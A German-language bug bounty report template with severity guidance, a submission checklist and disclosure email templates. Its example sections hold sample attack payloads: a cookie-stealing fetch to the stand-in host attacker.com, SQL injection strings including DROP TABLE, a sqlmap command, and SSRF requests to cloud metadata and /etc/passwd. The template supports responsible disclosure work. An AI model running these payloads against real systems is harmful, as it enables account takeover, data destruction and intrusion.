# 🐛 Vorlage für Bug-Bounty-Berichte

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Bug-Bounty-Report-Template.tr.md) • [🇬🇷 Ελληνικά](Bug-Bounty-Report-Template.el.md)

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝   
██████╗ ███████╗██████╗  ██████╗ ██████╗ ████████╗
██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝
██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝   ██║   
██╔══██╗██╔══╝  ██╔═══╝ ██║   ██║██╔══██╗   ██║   
██║  ██║███████╗██║     ╚██████╔╝██║  ██║   ██║   
╚═╝  ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
```

---

## 🎯 Kurzvorlage

````markdown
## Zusammenfassung
[Beschreibung der Schwachstelle in einem Satz]

## Schweregrad
[Kritisch/Hoch/Mittel/Niedrig] - CVSS: X.X

## Schwachstellentyp
[XSS/SQLi/IDOR/SSRF/etc.]

## URL/Endpoint
`https://example.com/vulnerable-endpoint`

## Schritte zur Reproduktion
1. Schritt 1
2. Schritt 2
3. Schritt 3

## Auswirkung
[Was ein Angreifer erreichen kann]

## Machbarkeitsnachweis (PoC)
[Code/Bildschirmaufnahmen/Video]

## Behebung
[Wie sich die Schwachstelle beheben lässt]
````

---

## 📝 Vollständige Berichtsvorlage

### Titelformat
```
[Schweregrad] [Schwachstellentyp] in [Funktion/Endpunkt] ermöglicht [Auswirkung]

Beispiele:
- [Kritisch] SQL-Injection im Anmeldeformular ermöglicht Datenbank Extraction
- [Hoch] Gespeichertes XSS in Kommentaren ermöglicht Kontoübernahme
- [Mittel] IDOR in /api/users/{id} legt personenbezogene Daten anderer Benutzer offen
```

---

## 📋 Detaillierter Berichtsaufbau

````markdown
# [Schwachstellentyp] in [Funktion/Endpunkt]

## Zusammenfassung
In [Funktion/Endpunkt] wurde eine Schwachstelle des Typs [Schwachstellentyp] entdeckt, die 
es einem Angreifer ermöglicht, [Auswirkung]. Betroffen sind [Umfang/Benutzer].

## Bewertung des Schweregrads

| Metrik | Wert |
|--------|-------|
| **Schweregrad** | Kritisch / Hoch / Mittel / Niedrig |
| **CVSS-Bewertung** | X.X |
| **CVSS-Vektor** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-XXX: [CWE-Bezeichnung] |

## Details zur Schwachstelle

### Betroffenes Prüfobjekt
- **URL:** `https://example.com/path/to/endpoint`
- **Parameter:** `parameter_name`
- **Methode:** GET/POST
- **Authentifizierung:** Erforderlich/Nicht erforderlich

### Verwundbarer Code / verwundbare Konfiguration
[Falls einsehbar/anwendbar]

## Schritte zur Reproduktion

### Voraussetzungen
- Konto erforderlich: Ja/Nein
- Besonderer Zugriff erforderlich: [beschreiben]
- Browser/Werkzeug: [angeben]

### Reproduktionsschritte

1. **Zum verwundbaren Endpunkt navigieren**
   ```
   https://example.com/vulnerable-page
   ```

2. **Payload einschleusen**
   ```
   [Payload hier einfügen]
   ```

3. **Ergebnis beobachten**
   - [Was geschieht]

### HTTP-Anfrage
```http
POST /api/endpoint HTTP/1.1
Host: example.com
Content-Type: application/json
Cookie: session=abc123

{
  "parameter": "malicious_payload_here"
}
```

### HTTP-Antwort
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "result": "vulnerable_response"
}
```

## Machbarkeitsnachweis (PoC)

### Verwendete Payload
```
[Ihre Payload hier einfügen]
```

### Bildschirmaufnahmen als Nachweis
![Beschreibung](attachment_url)

### Video-PoC
[Link zur Videodemonstration]

### Automatisiertes PoC-Skript (optional)
```python
import requests

url = "https://example.com/vulnerable"
payload = {"param": "malicious_input"}
response = requests.post(url, json=payload)
print(response.text)
```

## Bewertung der Auswirkungen

### Technische Auswirkungen
- **Vertraulichkeit:** [Daten, auf die zugegriffen werden kann]
- **Integrität:** [Daten, die verändert werden können]
- **Verfügbarkeit:** [Mögliche Dienstunterbrechung]

### Geschäftliche Auswirkungen
- [Finanzielle Auswirkungen]
- [Reputationsschaden]
- [Verstöße gegen Vorschriften/Compliance-Anforderungen]
- [Anzahl betroffener Benutzer]

### Angriffsszenario
Ein Angreifer könnte diese Schwachstelle ausnutzen, um:
1. [Konkrete Aktion 1]
2. [Konkrete Aktion 2]
3. [Konkrete Aktion 3]

## Empfehlungen zur Behebung

### Sofortmaßnahme
[Sofortmaßnahme zur Risikominderung]

### Langfristige Lösung
[Dauerhafte Behebung]

### Codebeispiel zur Behebung
```python
# Vorher (verwundbar)
query = f"SELECT * FROM users WHERE id = {user_input}"

# Nachher (behoben)
query = "SELECT * FROM users WHERE id = %s"
cursor.execute(query, (user_input,))
```

## Referenzen
- [OWASP-Link]
- [CWE-Link]
- [Zugehörige CVEs]
- [Blogbeiträge/Forschung]

## Zeitplan
| Datum | Maßnahme |
|------|--------|
| YYYY-MM-DD | Schwachstelle entdeckt |
| YYYY-MM-DD | Bericht eingereicht |
| YYYY-MM-DD | Vom Anbieter bestätigt |
| YYYY-MM-DD | Korrektur bereitgestellt |
| YYYY-MM-DD | Prämie gewährt |
````

---

## 🔥 Vorlagen nach Schwachstellentyp

### XSS (Cross-Site Scripting)

````markdown
## Zusammenfassung
Eine reflektierte/gespeicherte XSS-Schwachstelle in [Endpunkt] ermöglicht Angreifern, 
beliebiges JavaScript in den Browsern der betroffenen Personen auszuführen.

## Payload
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

## Auswirkung
- Sitzungsübernahme durch Cookie-Diebstahl
- Kontoübernahme
- Aufzeichnen von Tastatureingaben (Keylogging)
- Phishing-Angriffe
- Verbreitung von Schadsoftware

## PoC
```javascript
// Cookie-Diebstahl
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>
```
````

### SQL Injection

````markdown
## Zusammenfassung
SQL-Injection im Parameter [Parameter] unter [Endpunkt] ermöglicht das Auslesen von Datenbankinhalten.

## Payload
```sql
' OR '1'='1'--
' UNION SELECT username,password FROM users--
1; DROP TABLE users--
```

## Nachweise
- Datenbank: MySQL 8.0
- Ausgelesene Tabellen: users, orders, payments
- Zugängliche Datensätze: 10,000+

## SQLMap-Befehl
```bash
sqlmap -u "https://example.com/page?id=1" --dbs --batch
```
````

### IDOR (Insecure Direct Object Reference)

````markdown
## Zusammenfassung
Eine IDOR-Schwachstelle in [Endpunkt] ermöglicht den Zugriff auf [Ressource] anderer Benutzer.

## Reproduktion
1. Als Benutzer A anmelden (ID: 100)
2. Aufrufen: `GET /api/users/100/profile`
3. ID auf 101 ändern: `GET /api/users/101/profile`
4. Beobachten: Die Daten von Benutzer B werden zurückgegeben

## Auswirkung
- Offenlegung personenbezogener Daten (Name, E-Mail, Adresse)
- Daten von [X] Benutzern zugänglich
- Verstoß gegen DSGVO/Datenschutzvorgaben

## Nachweise
| Anfrage | Antwort |
|---------|----------|
| `/api/users/100` | Daten von Benutzer A ✓ |
| `/api/users/101` | Daten von Benutzer B ✗ |
| `/api/users/102` | Daten von Benutzer C ✗ |
````

### SSRF (Server-Side Request Forgery)

````markdown
## Zusammenfassung
SSRF in [Funktion] ermöglicht Anfragen an interne Dienste.

## Payload
```
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
https://example.com/fetch?url=http://localhost:6379/
https://example.com/fetch?url=file:///etc/passwd
```

## Erreichte interne Ressourcen
- AWS-Metadatenendpunkt
- Interner Redis-Server
- Lokales Dateisystem

## Nachweise
```
HTTP/1.1 200 OK

ami-id: ami-12345678
instance-id: i-1234567890abcdef0
```
````

### Umgehung der Authentifizierung

````markdown
## Zusammenfassung
Eine Umgehung der Authentifizierung in [Funktion] ermöglicht unbefugten Zugriff auf [Ressource].

## Umgehungsmethode
[Umgehungstechnik beschreiben]

## Reproduktion
1. Geschützten Endpunkt ohne Authentifizierung aufrufen
2. [Konkrete Technik]
3. Zugriff gewährt

## Auswirkung
- Zugriff auf die Administrationsoberfläche
- Identitätsannahme eines anderen Benutzers
- Datenmanipulation
````

---

## 📊 Leitfaden zur Schweregradeinstufung

### Kritisch (P1)
```
- RCE (Ausführung von Code aus der Ferne)
- SQL-Injection mit Datenextraktion
- Umgehung der Authentifizierung mit Administratorzugriff
- Vollständige Kontoübernahme
- Manipulation von Zahlungen/Finanzdaten
- Personenbezogene Daten aller Benutzer offengelegt
```

### Hoch (P2)
```
- Gespeichertes XSS mit erheblichen Auswirkungen
- IDOR mit Zugriff auf vertrauliche Daten
- SSRF gegen interne Dienste
- Rechteausweitung
- Offenlegung vertraulicher Daten
```

### Mittel (P3)
```
- Reflektiertes XSS
- CSRF bei sicherheitskritischen Aktionen
- Informationspreisgabe
- Umgehung der Begrenzung von Anfragen (Rate Limiting)
- Sitzungsfixierung (Session Fixation)
```

### Niedrig (P4)
```
- Self-XSS
- IDOR ohne vertrauliche Daten
- Fehlende Sicherheitsheader
- Ausführliche Fehlermeldungen
- Ermitteln gültiger Benutzernamen
```

---

## ✅ Checkliste für die Einreichung

````markdown
## Vor der Einreichung

□ Klarer, aussagekräftiger Titel
□ Zutreffende Schweregradeinstufung
□ Schrittweise Reproduktionsanleitung
□ Funktionsfähiger Machbarkeitsnachweis (PoC)
□ Auswirkungen verständlich erläutert
□ Bildschirmaufnahmen/Video angehängt
□ Behebung vorgeschlagen
□ Prüfobjekt innerhalb des vereinbarten Umfangs bestätigt
□ Kein Duplikat (vorher gesucht)
□ Grammatik/Rechtschreibung geprüft
□ Vertrauliche Daten unkenntlich gemacht
□ Kontaktinformationen enthalten
````

---

## 💡 Praktische Tipps

### Empfehlenswert ✅
```
✓ Klar und knapp formulieren
✓ Alle erforderlichen Einzelheiten aufnehmen
✓ Funktionsfähigen PoC bereitstellen
✓ Auswirkungen erklären
✓ Maßnahmen zur Behebung vorschlagen
✓ Professionell und respektvoll bleiben
✓ Verantwortungsvolle Offenlegung einhalten
✓ Rückfragen zeitnah beantworten
```

### Zu vermeiden ❌
```
✗ Nicht auf echte Benutzerdaten zugreifen
✗ Keine Tests in der Produktionsumgebung durchführen
✗ Vereinbarten Umfang nicht überschreiten
✗ Automatisierte Scanner nicht ohne Genehmigung verwenden
✗ Nicht vor der Behebung veröffentlichen
✗ Bei Prämienverhandlungen nicht aggressiv auftreten
✗ Keine Duplikate einreichen
✗ Keine rein theoretischen Probleme einreichen
```

---

## 📧 Vorlagen für die Kommunikation

### Erstmeldung
```
Guten Tag [Sicherheitsteam],

ich habe eine Schwachstelle des Typs [Schwachstellentyp] mit dem Schweregrad [Schweregrad] in 
[Produkt/Funktion] entdeckt. Die vollständigen Einzelheiten finden Sie in meinem Bericht.

Zusammenfassung: [Ein Satz]
Auswirkung: [Kurze Beschreibung der Auswirkungen]
PoC: [Angehängt/Enthalten]

Bitte lassen Sie mich wissen, ob Sie weitere Informationen benötigen.

Mit freundlichen Grüßen
[Ihr Name]
[HackerOne-/Bugcrowd-Profil]
```

### Nachfrage
```
Guten Tag,

ich frage zum Bericht #[ID] nach, den ich am [Datum] eingereicht habe. 
Könnten Sie mir den aktuellen Bearbeitungsstand mitteilen?

Vielen Dank.
```

### Diskussion über die Prämie
```
Vielen Dank für die Bewertung meines Berichts. Meiner Einschätzung nach sollte der Schweregrad 
[höher/anders] eingestuft werden, weil:

1. [Grund 1]
2. [Grund 2]

Würden Sie eine erneute Bewertung der Prämienhöhe in Betracht ziehen?
```

---

**Zurück zu Reporting:** 📝 Berichtsvorlagen (die im Original verlinkte Datei `Reporting/README.md` fehlt).

---

## Hinweise zur deutschen Ausgabe

> **Bewertung statt Schablone:** P1–P4 und die Zuordnung ganzer Schwachstellenklassen zu einem Schweregrad sind Beispiele, keine allgemeingültigen Programmregeln. Entscheidend sind die belegten Auswirkungen, Voraussetzungen und die Richtlinien des jeweiligen Programms. CVSS bewertet den technischen Schweregrad; ein Basiswert allein beschreibt nicht das gesamte geschäftliche Risiko. Der Vektor `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` steht für den Basiswert 9.8; `X.X` ist ein zu ersetzender Platzhalter. [FIRST: CVSS v3.1](https://www.first.org/cvss/v3-1/specification-document), [FIRST: CVSS und Risiko](https://www.first.org/cvss/v4.0/user-guide).

> **Beispielgrenzen:** XSS belegt nicht automatisch eine Kontoübernahme; etwa `HttpOnly` verhindert das Auslesen des entsprechenden Cookies über `document.cookie`. Auch SSRF auf Metadaten und die gezeigten Datenbankauswirkungen hängen von tatsächlichen Berechtigungen und Schutzmaßnahmen ab. Der Platzhalter `%s` bei parametrisierten SQL-Abfragen ist treiberabhängig. Datenschutzverstöße, Datensatzmengen und Geschäftsschäden müssen belegt werden; sie folgen nicht automatisch aus dem Namen einer Schwachstelle. Die Test- und Offenlegungsregeln sind mit dem jeweiligen Programm abzugleichen.

> **Verwendung der Vorlage:** Endpunkte, Payloads, Anhangs-URLs und Beispielwerte bleiben wörtlich erhalten und sind keine geprüften Live-Ziele oder realen Befunde. Äußere Markdown-Vorlagen verwenden vier Backticks, damit die enthaltenen dreifachen Code-Fences korrekt angezeigt und kopiert werden können. [CommonMark: Code-Fences](https://spec.commonmark.org/0.31.2/#fenced-code-blocks).
